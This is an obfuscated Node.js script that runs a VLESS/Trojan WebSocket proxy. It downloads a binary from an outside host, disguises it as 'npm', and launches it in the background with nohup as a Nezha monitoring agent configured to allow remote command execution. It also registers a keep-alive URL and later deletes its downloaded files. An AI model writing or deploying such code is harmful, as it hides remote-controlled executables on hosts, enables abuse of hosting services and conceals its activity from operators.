const _0x335489=_0x51b2;(function(_0x58e3cc,_0x627461){const _0x5a9d65=_0x51b2,_0x339b96=_0x58e3cc();while(!![]){try{const _0x557e98=-parseInt(_0x5a9d65(0xcc))/0x1*(-parseInt(_0x5a9d65(0xcd))/0x2)+parseInt(_0x5a9d65(0xf2))/0x3*(-parseInt(_0x5a9d65(0xac))/0x4)+parseInt(_0x5a9d65(0x113))/0x5*(-parseInt(_0x5a9d65(0x118))/0x6)+parseInt(_0x5a9d65(0x102))/0x7*(-parseInt(_0x5a9d65(0xbc))/0x8)+-parseInt(_0x5a9d65(0xed))/0x9*(parseInt(_0x5a9d65(0x10a))/0xa)+-parseInt(_0x5a9d65(0x107))/0xb+parseInt(_0x5a9d65(0xc2))/0xc;if(_0x557e98===_0x627461)break;else _0x339b96['push'](_0x339b96['shift']());}catch(_0x5afbc6){_0x339b96['push'](_0x339b96['shift']());}}}(_0x2f13,0xc3d43));const os=require('os'),http=require(_0x335489(0xce)),fs=require('fs'),axios=require(_0x335489(0xd1)),net=require(_0x335489(0xfc)),path=require('path'),crypto=require(_0x335489(0x104)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x335489(0x109)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x335489(0x119)]||_0x335489(0xfb),NEZHA_SERVER=process[_0x335489(0xaf)][_0x335489(0xab)]||'',NEZHA_PORT=process[_0x335489(0xaf)][_0x335489(0xfe)]||'',NEZHA_KEY=process[_0x335489(0xaf)][_0x335489(0xef)]||'',DOMAIN=process[_0x335489(0xaf)][_0x335489(0x11a)]||_0x335489(0x112),AUTO_ACCESS=process[_0x335489(0xaf)]['AUTO_ACCESS']||!![],WSPATH=process[_0x335489(0xaf)][_0x335489(0xe5)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x335489(0xaf)]['SUB_PATH']||'sub',NAME=process['env'][_0x335489(0xc6)]||'',PORT=process['env'][_0x335489(0xb7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3b4bbc=_0x335489;try{const _0x3f8fb5=await axios[_0x3b4bbc(0x110)](_0x3b4bbc(0x100)),_0x29014a=_0x3f8fb5[_0x3b4bbc(0xa4)];ISP=(_0x29014a[_0x3b4bbc(0xf1)]+'-'+_0x29014a[_0x3b4bbc(0x10b)])['replace'](/ /g,'_');}catch(_0x201a2b){ISP=_0x3b4bbc(0x11c);}};function _0x51b2(_0x5dae1f,_0x1215a2){_0x5dae1f=_0x5dae1f-0xa4;const _0x2f1389=_0x2f13();let _0x51b282=_0x2f1389[_0x5dae1f];return _0x51b282;}GetISP();const httpServer=http[_0x335489(0xe0)]((_0x5aa9d1,_0x283429)=>{const _0x94fbf0=_0x335489;if(_0x5aa9d1['url']==='/'){const _0xc6eb1=path[_0x94fbf0(0xe6)](__dirname,_0x94fbf0(0x121));fs[_0x94fbf0(0xd4)](_0xc6eb1,'utf8',(_0x18ea15,_0x1abf01)=>{const _0x31508=_0x94fbf0;if(_0x18ea15){_0x283429[_0x31508(0xb8)](0xc8,{'Content-Type':_0x31508(0x10d)}),_0x283429[_0x31508(0x101)](_0x31508(0xff));return;}_0x283429[_0x31508(0xb8)](0xc8,{'Content-Type':_0x31508(0x10d)}),_0x283429[_0x31508(0x101)](_0x1abf01);});return;}else{if(_0x5aa9d1[_0x94fbf0(0x11b)]==='/'+SUB_PATH){const _0x3111f5=NAME?NAME+'-'+ISP:ISP,_0x1de773=_0x94fbf0(0xee)+UUID+'@'+DOMAIN+_0x94fbf0(0xea)+DOMAIN+_0x94fbf0(0xd6)+DOMAIN+_0x94fbf0(0xde)+WSPATH+'#'+_0x3111f5,_0x44e90e=_0x94fbf0(0xa7)+UUID+'@'+DOMAIN+_0x94fbf0(0xe2)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x94fbf0(0xde)+WSPATH+'#'+_0x3111f5,_0x37869b=_0x1de773+'\x0a'+_0x44e90e,_0x28001c=Buffer['from'](_0x37869b)[_0x94fbf0(0xec)]('base64');_0x283429[_0x94fbf0(0xb8)](0xc8,{'Content-Type':_0x94fbf0(0xdf)}),_0x283429[_0x94fbf0(0x101)](_0x28001c+'\x0a');}else _0x283429[_0x94fbf0(0xb8)](0x194,{'Content-Type':_0x94fbf0(0xdf)}),_0x283429['end'](_0x94fbf0(0xd8));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x335489(0x103),_0x335489(0xf5)];function resolveHost(_0x58fab4){return new Promise((_0x5a6b9d,_0x208bbd)=>{const _0x206cb2=_0x51b2;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x206cb2(0xb0)](_0x58fab4)){_0x5a6b9d(_0x58fab4);return;}let _0x27aa73=0x0;function _0x5adb04(){const _0x1ad287=_0x206cb2;if(_0x27aa73>=DNS_SERVERS['length']){_0x208bbd(new Error(_0x1ad287(0x108)+_0x58fab4+_0x1ad287(0xd2)));return;}const _0x1614a7=DNS_SERVERS[_0x27aa73];_0x27aa73++;const _0x1981be='https://dns.google/resolve?name='+encodeURIComponent(_0x58fab4)+'&type=A';axios[_0x1ad287(0x110)](_0x1981be,{'timeout':0x1388,'headers':{'Accept':_0x1ad287(0xf6)}})[_0x1ad287(0xb5)](_0x59b6d5=>{const _0x847179=_0x1ad287,_0xc3d9d1=_0x59b6d5[_0x847179(0xa4)];if(_0xc3d9d1[_0x847179(0xd3)]===0x0&&_0xc3d9d1[_0x847179(0xf4)]&&_0xc3d9d1[_0x847179(0xf4)][_0x847179(0x120)]>0x0){const _0x3603ad=_0xc3d9d1[_0x847179(0xf4)][_0x847179(0xe8)](_0x126f79=>_0x126f79[_0x847179(0xe7)]===0x1);if(_0x3603ad){_0x5a6b9d(_0x3603ad['data']);return;}}_0x5adb04();})[_0x1ad287(0xc1)](_0x68f165=>{_0x5adb04();});}_0x5adb04();});}function _0x2f13(){const _0x47448d=['readFile','concat','&fp=chrome&type=ws&host=','npm\x20running\x20error:','Not\x20Found\x0a','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','writeFileSync','close','connection','error','&path=%2F','text/plain','createServer','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',':443?security=tls&sni=','false','once','WSPATH','join','type','find','--tls',':443?encryption=none&security=tls&sni=','every','toString','3606849skKddS','vless://','NEZHA_KEY','substr','country_code','12219EgVsem','hex','Answer','1.1.1.1','application/dns-json','log','listen','2087','2096','ff6a23cf-a27b-48bb-ab7b-b251554ced35','net','connect','NEZHA_PORT','Hello\x20world!','https://api.ip.sb/geoip','end','78617zqtANa','8.8.4.4','crypto','2083','slice','8319663rBAVNo','Failed\x20to\x20resolve\x20','child_process','30gFsrXg','isp','message','text/html','config.yaml','\x20-p\x20','get','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1234.abc.com','242655iAbSbc','createWriteStream','https://amd64.ssss.nyc.mn/agent','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','error:\x20','132GsICRc','UUID','DOMAIN','url','Unknown','Automatic\x20Access\x20Task\x20added\x20successfully','https://arm64.ssss.nyc.mn/agent','setsid\x20nohup\x20./npm\x20-s\x20','length','index.html','utf-8','reduce','8443','map','stream','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','data','application/json','npm','trojan://','readUInt8','npm\x20is\x20running','trim','NEZHA_SERVER','1468UFUglu','finish','npm\x20download\x20successfully','env','test','https://amd64.ssss.nyc.mn/v1','send','split','pipe','then','pop','PORT','writeHead','npm\x20is\x20already\x20running,\x20skip\x20running...','https://oooo.serv00.net/add-url','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','536hQnaKi','digest','update','443','https://','catch','65381856VUtloy','/bin/bash','includes','readUInt16BE','NAME','write','Server\x20is\x20running\x20on\x20port\x20','client_secret:\x20','unlink','2053','89599SPRirn','14MixMIF','http','chmod\x20+x\x20npm','arch','axios','\x20with\x20all\x20DNS\x20servers','Status'];_0x2f13=function(){return _0x47448d;};return _0x2f13();}function handleVlessConnection(_0x4def47,_0x203153){const _0x57ed7e=_0x335489,[_0x529b2a]=_0x203153,_0x44de3e=_0x203153[_0x57ed7e(0x106)](0x1,0x11);if(!_0x44de3e['every']((_0x286bf6,_0x2c0912)=>_0x286bf6==parseInt(uuid[_0x57ed7e(0xf0)](_0x2c0912*0x2,0x2),0x10)))return![];let _0x516688=_0x203153[_0x57ed7e(0x106)](0x11,0x12)[_0x57ed7e(0xa8)]()+0x13;const _0x15461d=_0x203153['slice'](_0x516688,_0x516688+=0x2)[_0x57ed7e(0xc5)](0x0),_0x8dddc4=_0x203153['slice'](_0x516688,_0x516688+=0x1)[_0x57ed7e(0xa8)](),_0x339ba9=_0x8dddc4==0x1?_0x203153[_0x57ed7e(0x106)](_0x516688,_0x516688+=0x4)[_0x57ed7e(0xe6)]('.'):_0x8dddc4==0x2?new TextDecoder()['decode'](_0x203153[_0x57ed7e(0x106)](_0x516688+0x1,_0x516688+=0x1+_0x203153['slice'](_0x516688,_0x516688+0x1)[_0x57ed7e(0xa8)]())):_0x8dddc4==0x3?_0x203153['slice'](_0x516688,_0x516688+=0x10)[_0x57ed7e(0x123)]((_0x3b14a5,_0x2bcae3,_0x5e435a,_0x225dbd)=>_0x5e435a%0x2?_0x3b14a5[_0x57ed7e(0xd5)](_0x225dbd['slice'](_0x5e435a-0x1,_0x5e435a+0x1)):_0x3b14a5,[])['map'](_0x91d402=>_0x91d402[_0x57ed7e(0xc5)](0x0)[_0x57ed7e(0xec)](0x10))[_0x57ed7e(0xe6)](':'):'';_0x4def47[_0x57ed7e(0xb2)](new Uint8Array([_0x529b2a,0x0]));const _0x1aeb62=createWebSocketStream(_0x4def47);return resolveHost(_0x339ba9)['then'](_0x1d5826=>{net['connect']({'host':_0x1d5826,'port':_0x15461d},function(){const _0x10e291=_0x51b2;this['write'](_0x203153[_0x10e291(0x106)](_0x516688)),_0x1aeb62['on'](_0x10e291(0xdd),()=>{})[_0x10e291(0xb4)](this)['on'](_0x10e291(0xdd),()=>{})[_0x10e291(0xb4)](_0x1aeb62);})['on']('error',()=>{});})[_0x57ed7e(0xc1)](_0x1a88e5=>{const _0x4156e4=_0x57ed7e;net[_0x4156e4(0xfd)]({'host':_0x339ba9,'port':_0x15461d},function(){const _0x325b7b=_0x4156e4;this[_0x325b7b(0xc7)](_0x203153[_0x325b7b(0x106)](_0x516688)),_0x1aeb62['on'](_0x325b7b(0xdd),()=>{})[_0x325b7b(0xb4)](this)['on'](_0x325b7b(0xdd),()=>{})['pipe'](_0x1aeb62);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x23d0a8,_0x4642a4){const _0x588e64=_0x335489;try{if(_0x4642a4[_0x588e64(0x120)]<0x3a)return![];const _0x597069=_0x4642a4['slice'](0x0,0x38)['toString'](),_0x3fb6e9=[UUID];let _0x5dccb6=null;for(const _0x295065 of _0x3fb6e9){const _0x401fdc=crypto['createHash']('sha224')[_0x588e64(0xbe)](_0x295065)[_0x588e64(0xbd)](_0x588e64(0xf3));if(_0x401fdc===_0x597069){_0x5dccb6=_0x295065;break;}}if(!_0x5dccb6)return![];let _0x440085=0x38;_0x4642a4[_0x440085]===0xd&&_0x4642a4[_0x440085+0x1]===0xa&&(_0x440085+=0x2);const _0x3ab7ed=_0x4642a4[_0x440085];if(_0x3ab7ed!==0x1)return![];_0x440085+=0x1;const _0x4a6090=_0x4642a4[_0x440085];_0x440085+=0x1;let _0x7d6776,_0x18da9d;if(_0x4a6090===0x1)_0x7d6776=_0x4642a4[_0x588e64(0x106)](_0x440085,_0x440085+0x4)[_0x588e64(0xe6)]('.'),_0x440085+=0x4;else{if(_0x4a6090===0x3){const _0x144fe4=_0x4642a4[_0x440085];_0x440085+=0x1,_0x7d6776=_0x4642a4[_0x588e64(0x106)](_0x440085,_0x440085+_0x144fe4)['toString'](),_0x440085+=_0x144fe4;}else{if(_0x4a6090===0x4)_0x7d6776=_0x4642a4[_0x588e64(0x106)](_0x440085,_0x440085+0x10)['reduce']((_0x52aef0,_0x19963c,_0x243689,_0x5cb9cf)=>_0x243689%0x2?_0x52aef0[_0x588e64(0xd5)](_0x5cb9cf[_0x588e64(0x106)](_0x243689-0x1,_0x243689+0x1)):_0x52aef0,[])[_0x588e64(0x125)](_0x548f6b=>_0x548f6b['readUInt16BE'](0x0)[_0x588e64(0xec)](0x10))[_0x588e64(0xe6)](':'),_0x440085+=0x10;else return![];}}_0x18da9d=_0x4642a4[_0x588e64(0xc5)](_0x440085),_0x440085+=0x2;_0x440085<_0x4642a4['length']&&_0x4642a4[_0x440085]===0xd&&_0x4642a4[_0x440085+0x1]===0xa&&(_0x440085+=0x2);const _0x574677=createWebSocketStream(_0x23d0a8);return resolveHost(_0x7d6776)['then'](_0x1dfba7=>{const _0x1efc4c=_0x588e64;net[_0x1efc4c(0xfd)]({'host':_0x1dfba7,'port':_0x18da9d},function(){const _0x33e59b=_0x1efc4c;_0x440085<_0x4642a4[_0x33e59b(0x120)]&&this[_0x33e59b(0xc7)](_0x4642a4[_0x33e59b(0x106)](_0x440085)),_0x574677['on'](_0x33e59b(0xdd),()=>{})[_0x33e59b(0xb4)](this)['on']('error',()=>{})[_0x33e59b(0xb4)](_0x574677);})['on'](_0x1efc4c(0xdd),()=>{});})['catch'](_0x29d81b=>{const _0x42afdb=_0x588e64;net[_0x42afdb(0xfd)]({'host':_0x7d6776,'port':_0x18da9d},function(){const _0x5d3b06=_0x42afdb;_0x440085<_0x4642a4[_0x5d3b06(0x120)]&&this[_0x5d3b06(0xc7)](_0x4642a4[_0x5d3b06(0x106)](_0x440085)),_0x574677['on'](_0x5d3b06(0xdd),()=>{})['pipe'](this)['on'](_0x5d3b06(0xdd),()=>{})[_0x5d3b06(0xb4)](_0x574677);})['on'](_0x42afdb(0xdd),()=>{});}),!![];}catch(_0x3c358b){return![];}}wss['on'](_0x335489(0xdc),(_0x20c224,_0x26c0dd)=>{const _0x238ed5=_0x335489,_0x47eef4=_0x26c0dd[_0x238ed5(0x11b)]||'';_0x20c224[_0x238ed5(0xe4)](_0x238ed5(0x10c),_0x410cf4=>{const _0x6e69e0=_0x238ed5;if(_0x410cf4[_0x6e69e0(0x120)]>0x11&&_0x410cf4[0x0]===0x0){const _0x26ffae=_0x410cf4['slice'](0x1,0x11),_0x70319e=_0x26ffae[_0x6e69e0(0xeb)]((_0x3ffb58,_0x1c51df)=>_0x3ffb58==parseInt(uuid[_0x6e69e0(0xf0)](_0x1c51df*0x2,0x2),0x10));if(_0x70319e){!handleVlessConnection(_0x20c224,_0x410cf4)&&_0x20c224[_0x6e69e0(0xdb)]();return;}}!handleTrojanConnection(_0x20c224,_0x410cf4)&&_0x20c224[_0x6e69e0(0xdb)]();})['on'](_0x238ed5(0xdd),()=>{});});const getDownloadUrl=()=>{const _0x1892a9=_0x335489,_0x518d86=os[_0x1892a9(0xd0)]();return _0x518d86==='arm'||_0x518d86==='arm64'||_0x518d86==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x1892a9(0x11e):!NEZHA_PORT?_0x1892a9(0xb1):_0x1892a9(0x115);},downloadFile=async()=>{const _0x1f2a9b=_0x335489;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3dfed7=getDownloadUrl(),_0x4e20ed=await axios({'method':_0x1f2a9b(0x110),'url':_0x3dfed7,'responseType':_0x1f2a9b(0x126)}),_0x4b1a2e=fs[_0x1f2a9b(0x114)](_0x1f2a9b(0xa6));return _0x4e20ed[_0x1f2a9b(0xa4)][_0x1f2a9b(0xb4)](_0x4b1a2e),new Promise((_0x2e26ff,_0x5d2889)=>{const _0x23dc30=_0x1f2a9b;_0x4b1a2e['on'](_0x23dc30(0xad),()=>{const _0x53481b=_0x23dc30;console[_0x53481b(0xf7)](_0x53481b(0xae)),exec(_0x53481b(0xcf),_0x217dd9=>{if(_0x217dd9)_0x5d2889(_0x217dd9);_0x2e26ff();});}),_0x4b1a2e['on'](_0x23dc30(0xdd),_0x5d2889);});}catch(_0x2cdfd7){throw _0x2cdfd7;}},runnz=async()=>{const _0x115633=_0x335489;try{const _0x3f9545=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x115633(0x122)});if(_0x3f9545[_0x115633(0xaa)]()!==''){console[_0x115633(0xf7)](_0x115633(0xb9));return;}}catch(_0xe6d0f4){}await downloadFile();let _0x3c0c21='',_0x5e9c3e=[_0x115633(0xbf),_0x115633(0x124),_0x115633(0xfa),_0x115633(0xf9),_0x115633(0x105),_0x115633(0xcb)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5b6247=_0x5e9c3e[_0x115633(0xc4)](NEZHA_PORT)?_0x115633(0xe9):'';_0x3c0c21=_0x115633(0x11f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x115633(0x10f)+NEZHA_KEY+'\x20'+_0x5b6247+_0x115633(0xbb);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xf2cb51=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x115633(0xb3)](':')[_0x115633(0xb6)]():'',_0x301d94=_0x5e9c3e[_0x115633(0xc4)](_0xf2cb51)?'true':_0x115633(0xe3),_0x225cbd=_0x115633(0xc9)+NEZHA_KEY+_0x115633(0xe1)+NEZHA_SERVER+_0x115633(0x116)+_0x301d94+_0x115633(0x111)+UUID;fs[_0x115633(0xda)](_0x115633(0x10e),_0x225cbd);}_0x3c0c21=_0x115633(0x127);}else{console[_0x115633(0xf7)](_0x115633(0xd9));return;}}try{exec(_0x3c0c21,{'shell':_0x115633(0xc3)},_0x24e185=>{const _0x569e46=_0x115633;if(_0x24e185)console[_0x569e46(0xdd)](_0x569e46(0xd7),_0x24e185);else console[_0x569e46(0xf7)](_0x569e46(0xa9));});}catch(_0x2b20e9){console[_0x115633(0xdd)](_0x115633(0x117)+_0x2b20e9);}};async function addAccessTask(){const _0x24078=_0x335489;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x370075=_0x24078(0xc0)+DOMAIN;try{const _0x46549e=await axios['post'](_0x24078(0xba),{'url':_0x370075},{'headers':{'Content-Type':_0x24078(0xa5)}});console[_0x24078(0xf7)](_0x24078(0x11d));}catch(_0x3ee673){}}const delFiles=()=>{const _0xd21053=_0x335489;fs[_0xd21053(0xca)](_0xd21053(0xa6),()=>{}),fs[_0xd21053(0xca)](_0xd21053(0x10e),()=>{});};httpServer[_0x335489(0xf8)](PORT,()=>{const _0x194bdd=_0x335489;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x194bdd(0xf7)](_0x194bdd(0xc8)+PORT);});